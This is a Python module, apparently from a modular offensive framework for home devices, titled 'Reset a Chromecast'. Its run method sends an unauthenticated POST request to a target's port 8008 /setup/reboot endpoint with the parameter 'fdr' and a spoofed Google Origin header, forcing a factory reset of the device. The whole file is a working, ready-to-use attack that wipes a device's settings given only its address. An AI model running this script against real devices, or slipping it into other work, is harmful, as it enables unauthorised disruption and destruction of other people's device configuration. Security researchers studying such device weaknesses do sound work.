import requests
from modules._module import Module
from utils.custom_print import print_info, print_error
from utildata.dataset_options import Option



class HomeModule(Module):

    def __init__(self):
        information = {"Name": "Reset a Chromecast",
                       "Description": "Factory reset for Chromecast",
                       "Author": "@pablogonzalezpe, @josueencinar"}

        # -----------name-----default_value--description--required?
        options = {"rhost": Option.create(name="rhost", required=True)}
        
        # Constructor of the parent class
        super(HomeModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run(self):
        uri = f"http://{self.args['rhost']}:8008/setup/reboot"
        headers = {
            'Content-Type':'application/json',
            'Origin': 'https://www.google.com',
            'Host': f"{self.args['rhost']}:8008"
        }
        
        data = {"params": "fdr"}

        response = requests.post(uri, headers=headers, data='{"params": "fdr"}')
        if response.status_code == 200:
            print_info("Factory reset!")
        else:
            print_error(f"Error, you should check HTTP Code: {response.status_code}")